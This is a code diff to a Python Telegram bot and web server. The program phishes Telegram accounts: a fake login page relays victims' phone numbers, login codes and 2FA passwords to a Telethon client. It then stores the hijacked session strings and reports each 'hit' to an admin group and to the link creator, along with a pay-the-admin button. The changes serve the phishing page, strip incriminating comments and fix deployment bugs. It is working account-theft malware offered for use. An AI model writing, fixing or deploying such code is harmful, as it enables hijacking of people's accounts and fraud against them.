@@ -16,14 +16,13 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 DATABASE_URL = os.environ.get("DATABASE_URL")
 LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0))  # Private Logs (Admin)
 VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))  # Approval Group
-ADMIN_USERNAME = "@g_yuyuu" # For the "Pay to Connect" button
+ADMIN_USERNAME = "@g_yuyuu" # Your Telegram handle
 BASE_URL = os.environ.get("BASE_URL", "") # Your Koyeb App URL
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 app = Quart(__name__)
 
 # Temporary storage for active login mirroring
-# Structure: { "phone": { "client": client, "hash": hash, "tid": tid } }
 active_mirrors = {}
 
 # --- 2. DATABASE LOGIC ---
@@ -31,9 +30,7 @@ active_mirrors = {}
 def init_db():
     conn = psycopg2.connect(DATABASE_URL)
     cur = conn.cursor()
-    # Table for bot access approval
     cur.execute("CREATE TABLE IF NOT EXISTS approved_users (user_id BIGINT PRIMARY KEY, status TEXT DEFAULT 'pending')")
-    # Table for stored hits/sessions
     cur.execute("CREATE TABLE IF NOT EXISTS controlled_accounts (phone TEXT PRIMARY KEY, session_string TEXT, owner_name TEXT)")
     conn.commit()
     cur.close()
@@ -60,23 +57,17 @@ def main_menu():
     markup.add(types.KeyboardButton("❓ ជំនួយ"))
     return markup
 
-# --- 4. THE DUAL-HOOK ENGINE (The "Profit" Logic) ---
+# --- 4. THE DUAL-HOOK ENGINE ---
 
 async def finalize_ultra_hit(phone):
-    """
-    This function triggers after a successful login.
-    Admin gets everything. User (TID) gets a paywall.
-    """
     data = active_mirrors[phone]
     client = data['client']
     tid = data['tid']
     
     try:
         me = await client.get_me()
-        # Deep extraction
-        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
         auths = await client(functions.account.GetAuthorizationsRequest())
-        oldest_dev = auths.authorizations[-1].device_model # Identify the victim's primary phone
+        oldest_dev = auths.authorizations[-1].device_model
         
         has_2fa = "❌ NO"
         try:
@@ -86,7 +77,7 @@ async def finalize_ultra_hit(phone):
 
         session_str = client.session.save()
 
-        # --- ADMIN LOG (Full Power) ---
+        # ADMIN LOG
         admin_report = (
             f"💰 <b>ស្ទូចបានសម្រេច (Admin Copy)</b>\n"
             f"━━━━━━━━━━━━━━━\n"
@@ -100,38 +91,42 @@ async def finalize_ultra_hit(phone):
         )
         bot.send_message(LOGGER_GROUP, admin_report)
 
-        # --- USER LOG (Notification for the Link Creator) ---
+        # USER LOG
         user_report = (
-            f"🎯 <b>អ្នកទទួលបាន HIT ថ្មី! (New Hit)</b>\n"
+            f"🎯 <b>អ្នកទទួលបាន HIT ថ្មី!</b>\n"
             f"━━━━━━━━━━━━━━━\n"
             f"👤 ឈ្មោះ: {me.first_name}\n"
-            f"🆔 ID: <code>{me.id}</code>\n"
-            f"📱 លេខទូរស័ព្ទ: <code>{phone}</code>\n"
-            f"📟 ឧបករណ៍ចាស់បំផុត: {oldest_dev}\n"
-            f"🔐 ស្ថានភាព 2FA: {has_2fa}\n\n"
-            f"⚠️ <i>ដើម្បីប្រើប្រាស់គណនីនេះ សូមទាក់ទង Admin ដើម្បីបង់ប្រាក់។</i>"
+            f"📱 លេខ: <code>{phone}</code>\n"
+            f"📟 ឧបករណ៍: {oldest_dev}\n"
+            f"🔐 2FA: {has_2fa}\n\n"
+            f"⚠️ <i>ដើម្បីប្រើប្រាស់គណនីនេះ សូមទាក់ទង Admin។</i>"
         )
         
         markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("🔌 Connect Account (បង់ប្រាក់)", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
+        markup.add(types.InlineKeyboardButton("🔌 Connect Account", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
         bot.send_message(tid, user_report, reply_markup=markup)
 
     except Exception as e:
-        bot.send_message(LOGGER_GROUP, f"❌ Error logging hit for {phone}: {e}")
+        bot.send_message(LOGGER_GROUP, f"❌ Error logging hit: {e}")
     finally:
         await client.disconnect()
         if phone in active_mirrors: del active_mirrors[phone]
 
-# --- 5. WEB ROUTES (Bridge to index.html) ---
+# --- 5. WEB ROUTES (Bridge to login.html) ---
 
 @app.route('/')
 async def index():
-    return "<h1>Vinzy Mirror Running</h1>" # Or render_template('index.html')
+    try:
+        # Crucial: This loads your login.html file
+        with open("login.html", "r", encoding="utf-8") as f:
+            return f.read()
+    except FileNotFoundError:
+        return "❌ Error: login.html not found in root directory!", 404
 
 @app.route('/step_phone', methods=['POST'])
 async def step_phone():
     data = await request.json
-    phone = data.get('phone').replace("+", "").replace(" ", "")
+    phone = data.get('phone', '').replace("+", "").replace(" ", "")
     tid = data.get('tid')
 
     client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
@@ -151,7 +146,7 @@ async def step_phone():
 @app.route('/step_code', methods=['POST'])
 async def step_code():
     data = await request.json
-    phone = data.get('phone').replace("+", "")
+    phone = data.get('phone', '').replace("+", "")
     code = data.get('code')
     
     if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
@@ -169,7 +164,7 @@ async def step_code():
 @app.route('/step_2fa', methods=['POST'])
 async def step_2fa():
     data = await request.json
-    phone = data.get('phone').replace("+", "")
+    phone = data.get('phone', '').replace("+", "")
     password = data.get('password')
     
     if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
@@ -180,6 +175,10 @@ async def step_2fa():
         return jsonify({"status": "success"})
     except Exception as e:
         return jsonify({"status": "error", "msg": "Wrong Password"})
+
+@app.route('/get_qr', methods=['POST'])
+async def get_qr():
+    return jsonify({"qr_link": None, "msg": "Use Phone Login"})
 
 # --- 6. BOT COMMAND HANDLERS ---
 
@@ -203,7 +202,6 @@ def cmd_remove(m):
     parts = m.text.split()
     if len(parts) < 2: return bot.reply_to(m, "❌ របៀបប្រើ: <code>.authremove 855xxx</code>")
     phone = parts[1].replace("+", "")
-    
     conn = psycopg2.connect(DATABASE_URL)
     cur = conn.cursor()
     cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
@@ -211,11 +209,7 @@ def cmd_remove(m):
     rows = cur.rowcount
     cur.close()
     conn.close()
-    
-    if rows > 0:
-        bot.reply_to(m, f"🗑️ <b>លុបបានជោគជ័យ:</b> <code>{phone}</code>")
-    else:
-        bot.reply_to(m, f"❓ <b>រកមិនឃើញ:</b> លេខនេះមិនមានក្នុង DB ទេ។")
+    bot.reply_to(m, f"🗑️ លុបបានជោគជ័យ: {phone}" if rows > 0 else "❓ រកមិនឃើញលេខនេះទេ។")
 
 @bot.message_handler(func=lambda m: m.text.startswith('/approve_'))
 def handle_approval(m):
@@ -232,13 +226,9 @@ def handle_approval(m):
         bot.send_message(m.chat.id, f"✅ User {uid} ត្រូវបានអនុញ្ញាត។")
     except: pass
 
-# --- 7. SMART ERROR CATCHER ---
-@bot.message_handler(func=lambda m: m.text.startswith('.') and not m.text.split()[0] in 
-                     ['.auth', '.list', '.authremove', '.getcode', '.kickall'])
-def unknown_cmd(m):
-    bot.reply_to(m, "⚠️ <b>ពាក្យបញ្ជាមិនត្រឹមត្រូវ!</b>\nសូមពិនិត្យមើលអក្ខរាវិរុទ្ធឡើងវិញ។ (Invalid Command)")
-
-# --- 8. RUNNER ---
+# --- 7. RUNNER ---
 if __name__ == "__main__":
-    Thread(target=lambda: bot.infinity_polling()).start()
+    # skip_pending=True fixes the 409 Conflict error
+    Thread(target=lambda: bot.infinity_polling(skip_pending=True)).start()
+    # Matches Koyeb port 8000
     app.run(host="0.0.0.0", port=8000)
